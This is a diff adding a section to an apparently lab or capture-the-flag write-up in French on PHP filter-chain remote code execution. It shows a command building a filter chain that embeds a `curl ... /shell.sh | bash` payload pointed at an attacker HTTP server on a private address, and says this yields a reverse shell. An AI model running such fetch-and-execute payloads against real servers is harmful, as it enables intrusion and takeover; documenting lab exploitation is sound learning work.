@@ -67,3 +67,15 @@ On rajoute donc le paramètre <mark>&amp;cmd=curl http://10.10.102.158:8000/shel
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746545277448/eb5f10ea-c90f-4b52-865c-e53d93920002.png align="center")
 
 ## Avec curl
+
+On peut aussi spécifier directement la commande curl dans le payload lors de la génération de la chaîne de filtres PHP. C’est une alternative pour exécuter directement la commande curl sur le serveur, sans avoir à passer de paramètres supplémentaires à l’URL.
+
+```bash
+python3 attack.py --chain '<?= `curl 10.10.102.158:8000/shell.sh | bash` ?>'
+```
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746548656865/269b63b9-85e4-44f9-9f18-439422d48219.png align="center")
+
+Ce payload utilise la syntaxe courte `<?= ?>` pour exécuter la commande `curl` qui télécharge et exécute le script `shell.sh` depuis le serveur HTTP.
+
+Une fois la chaîne de filtres générée, on peut l’intégrer dans l’URL et obtenir l’accès sur la machine en reverse shell.
